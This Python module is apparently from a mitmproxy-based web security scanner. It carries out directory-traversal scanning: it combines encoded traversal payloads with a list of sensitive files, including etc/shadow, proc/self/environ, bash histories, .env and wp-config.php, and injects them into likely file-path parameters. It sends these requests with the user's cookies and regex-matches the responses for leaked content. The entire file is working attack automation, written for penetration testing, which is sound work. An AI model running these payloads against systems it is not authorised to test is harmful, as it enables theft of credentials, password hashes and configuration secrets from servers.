# nightcrawler/active_scans/traversal.py
import httpx
import re
import sys

# Import necessary types from typing
from typing import Dict, Any, List, TYPE_CHECKING, Pattern, Set, Optional

# Import ctx, but use it defensively
from mitmproxy import ctx, http  # Added http for potential type hints if needed

# Type hint for MainAddon
if TYPE_CHECKING:
    from nightcrawler.addon import MainAddon

# --- Configuration (Constants remain the same) ---
# --- Configuration for Traversal Scan ---

# Payloads for directory traversal attempts
TRAVERSAL_PAYLOADS: List[str] = [
    "../",
    "../../",
    "../../../",
    "../../../../",
    "../../../../../",
    "..%2f",
    "..%2f..%2f",
    "..%2f..%2f..%2f",
    "..%2f..%2f..%2f..%2f",
    "..%2f..%2f..%2f..%2f..%2f",
    "..\\",
    "..\\..\\",
    "..\\..\\..\\",
    "..\\..\\..\\..\\",
    "..%5c",
    "..%5c..%5c",
    "..%5c..%5c..%5c",
    # Null byte attempts (URL encoded %00)
    "../%00",
    "../../%00",
    "../%00.txt",  # Example with extension
    # Windows UNC Path Bypass?
    # "//", "\\", "//localhost/", "\\localhost\\" # Needs careful testing
    # Double encoding?
    # "..%252f", "..%255c"
]

# Target sensitive files to look for (used in combination with traversals)
TARGET_FILES: List[str] = [
    # Linux/Unix common files
    "etc/passwd",
    "etc/shadow",
    "etc/group",
    "etc/hosts",
    "etc/motd",
    "etc/issue",
    "proc/self/environ",
    "proc/version",
    "proc/cmdline",
    "root/.bash_history",
    "home/admin/.bash_history",  # Common user history
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
    "var/log/httpd/access_log",
    "var/log/httpd/error_log",
    "var/log/nginx/access.log",
    "var/log/nginx/error.log",
    "var/log/syslog",
    "var/log/messages",
    "var/log/auth.log",
    # Windows common files
    "windows/win.ini",
    "winnt/win.ini",
    "windows/system32/drivers/etc/hosts",
    # Web Application / Framework specific files
    "WEB-INF/web.xml",
    "WEB-INF/database.properties",
    "WEB-INF/applicationContext.xml",
    "WEB-INF/config.xml",
    "WEB-INF/classes/log4j.properties",
    ".env",
    ".env.local",
    ".env.prod",
    ".env.development",
    "env.yaml",
    "appsettings.json",
    "appsettings.Development.json",  # .NET Core
    "web.config",  # .NET Framework / IIS
    "composer.json",
    "composer.lock",  # PHP Composer
    "package.json",
    "package-lock.json",  # Node.js
    # Common server / user config files
    ".htpasswd",
    ".htaccess",
    "config.php",
    "config.inc.php",
    "wp-config.php",
    "configuration.php",
    "settings.py",
    "settings.php",
    "local.xml",
    # Common log files (generic names)
    "log.txt",
    "error.log",
    "app.log",
    "debug.log",
    "access.log",
]

# Regex patterns to identify sensitive content in responses
SENSITIVE_CONTENT_PATTERNS: List[Pattern] = [
    re.compile(r"root:x:0:0", re.IGNORECASE),  # /etc/passwd format
    re.compile(r"\[boot loader\]", re.IGNORECASE),  # win.ini section
    re.compile(r"<web-app", re.IGNORECASE),  # web.xml start
    re.compile(
        r"(?:jdbc|db|database)\.(?:url|password|username)\s*=", re.IGNORECASE
    ),  # database properties
    re.compile(r"<beans", re.IGNORECASE),  # Spring applicationContext.xml start
    re.compile(
        r"\b(?:(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))",
        re.IGNORECASE,
    ),  # Basic IPv4
    re.compile(
        r"failed to open stream|permission denied|failed opening required|include\(/|require\(/",
        re.IGNORECASE,
    ),  # Common PHP errors
    re.compile(
        r"java\.io\.FileNotFoundException|javax\.servlet\.ServletException",
        re.IGNORECASE,
    ),  # Common Java errors
    re.compile(r"django.*?settings", re.IGNORECASE),  # Django settings exposure hint
    # Add more patterns as needed
]

# Parameter names often associated with file inclusion/paths
SUSPICIOUS_PARAM_NAMES: Set[str] = {
    "file",
    "page",
    "path",
    "document",
    "doc",
    "template",
    "include",
    "view",
    "dir",
    "folder",
    "item",
    "id",
    "content",
    "resource",
    "name",
    "filename",
    "conf",
    "setting",
    "style",
    "sheet",
    "config",
    "url",
    "uri",
    "load",
    "show",
    "file_path",
    "filePath",
    "document_root",
    "doc_root",
    "image",
    "img",
    "picture",
    "data",
    "input",
    "ret",
    "return",
    "return_to",
}


# --- Scanner Function ---
async def scan_directory_traversal(
    target_info: Dict[str, Any],
    cookies: Dict[str, str],
    http_client: httpx.AsyncClient,
    addon_instance: "MainAddon",
):
    """Attempts basic directory traversal payloads on likely parameters."""
    url = target_info["url"]
    method = target_info["method"].upper()
    original_params = target_info["params"]
    original_data = target_info["data"]
    original_headers = target_info["headers"]

    # Identify parameters to fuzz
    params_to_fuzz: Dict[str, str] = {}
    potential_params = {**original_params, **original_data}
    for p_name, p_val in potential_params.items():
        if p_name.lower() in SUSPICIOUS_PARAM_NAMES:
            params_to_fuzz[p_name] = p_val
    if not params_to_fuzz:
        return

    # Use ctx safely for logging start
    try:
        ctx.log.debug(
            f"[Traversal Scan] Starting for {url}. Params: {list(params_to_fuzz.keys())}"
        )
    except AttributeError:
        pass  # Ignore if ctx.log not available

    full_payloads = [t + f for t in TRAVERSAL_PAYLOADS for f in TARGET_FILES]

    # Prepare Filtered Headers (once)
    request_headers = {
        k: v
        for k, v in original_headers.items()
        if k.lower()
        not in ["content-length", "host", "transfer-encoding", "connection", "cookie"]
    }
    if method == "POST" and "content-type" not in request_headers:  # Assume urlencoded
        original_content_type = original_headers.get("content-type")
        if original_content_type and "urlencoded" in original_content_type.lower():
            request_headers["content-type"] = original_content_type
    if cookies:
        request_headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in cookies.items()])

    logged_findings_for_target_param = set()

    for param_name in params_to_fuzz.keys():
        for payload in full_payloads:
            current_params = original_params.copy()
            current_data = original_data.copy()
            is_param_in_query = param_name in original_params
            if is_param_in_query:
                current_params[param_name] = payload
            else:
                current_data[param_name] = payload

            finding_key = f"{param_name}::{payload}"
            if finding_key in logged_findings_for_target_param:
                continue

            payload_info_detail = f"Param: {param_name}, Payload: {payload}"
            payload_info_evidence = {"param": param_name, "payload": payload}

            try:
                req_details_for_log = {
                    "method": method,
                    "url": url.split("?")[0] if is_param_in_query else url,
                    "params": current_params if is_param_in_query else original_params,
                    "data": current_data if not is_param_in_query else original_data,
                    "headers": request_headers,
                    # Cookies sono nell'header 'Cookie' dentro request_headers
                }
                try:
                    ctx.log.debug(
                        f"[Traversal Scan] >>> Sending Request Details: {req_details_for_log}"
                    )
                except AttributeError:  # Fallback per pytest
                    import json

                    print(
                        f"DEBUG [Traversal Scan] >>> Sending Request Details: {json.dumps(req_details_for_log, default=str)}",
                        file=sys.stderr,
                    )

                # Send request
                response = await http_client.request(
                    method,
                    url.split("?")[0] if is_param_in_query else url,
                    params=current_params if is_param_in_query else original_params,
                    data=current_data if not is_param_in_query else original_data,
                    headers=request_headers,  # Use filtered headers
                    # No 'cookies=' argument
                )

                # Analyze Response
                if 200 <= response.status_code < 300 and response.content:
                    response_text = response.text  # Decode text content safely
                    if response_text:
                        for pattern in SENSITIVE_CONTENT_PATTERNS:
                            if pattern.search(response_text):
                                if finding_key not in logged_findings_for_target_param:
                                    addon_instance._log_finding(
                                        level="ERROR",
                                        finding_type="Directory Traversal? (Content Match)",
                                        url=url,
                                        detail=f"Found pattern indicative of successful traversal ('{pattern.pattern}') in response. {payload_info_detail}",
                                        evidence={
                                            **payload_info_evidence,
                                            "matched_pattern": pattern.pattern,
                                        },
                                    )
                                    logged_findings_for_target_param.add(finding_key)
                                    # break # Optional: Stop after first pattern match for this payload?

            except httpx.TimeoutException:
                # Use ctx safely
                try:
                    ctx.log.warn(f"[Traversal Scan] Timeout for {payload_info_detail}")
                except AttributeError:
                    pass
            except Exception as e:
                # Use ctx safely
                try:
                    ctx.log.debug(
                        f"[Traversal Scan] Exception for {payload_info_detail}: {e}"
                    )
                except AttributeError:
                    pass

    # Use ctx safely for logging finish
    try:
        ctx.log.debug(f"[Traversal Scan] Finished for {url}")
    except AttributeError:
        pass


# End of nightcrawler/active_scans/traversal.py
